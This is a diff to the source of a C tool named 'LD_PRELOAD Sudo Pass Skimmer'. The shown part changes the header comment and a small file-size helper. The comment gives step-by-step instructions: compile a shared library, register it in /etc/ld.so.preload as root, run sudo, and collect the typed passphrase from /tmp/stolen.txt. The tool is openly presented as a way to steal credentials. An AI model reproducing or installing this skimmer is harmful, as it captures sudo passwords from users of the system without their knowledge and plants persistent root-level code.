@@ -2,19 +2,20 @@
 /* 
  *                           LD_PRELOAD Sudo Pass Skimmer
  *
- *                        -- oxagast / Marshall Whittaker --
- * marshall@oxasploits.com
+ *                                 -- oxagast --
+ *
+ * oxagast@oxasploits.com
  * https://oxasploits.com
+ * The funtional equivilent of a DLL jack, but for Linux. LDPL jacking?
  * Compile using: gcc -fPIC -shared -ldl -Wall sudo_lib_hook.c -o
  * /tmp/cap_pass.so Then add /tmp/cap_pass.so to /etc/ld.so.preload (you'll need
  * to do this as root). Then sudo su. Log back out of the shell and check
  * /tmp/stolen.txt.
- *
  * /tmp/stolen.txt should now contain the passphrase you entered.
  *
  *
  * immense thanks to vesteria for the general idea of skimming passwords!
- *  enrmous thanks to blissful boy for the file size func!
+ * enrmous thanks to blissful boy for the file size func!
  * gargantuan thanks to atdma for catching the lack of void* cast!
  * and a collossal thanks to everyone who has found this useful!
  * <3 you guys
@@ -36,13 +37,10 @@
 long long
 getfsize (const char *fn) {
   struct stat st;
-
   if(stat (fn, &st) != 0) {
     return -1;
   }
   off_t fs = st.st_size;
-
-  // printf("size: %lld", (long long)fs);
   return (long long)fs;
 }
 
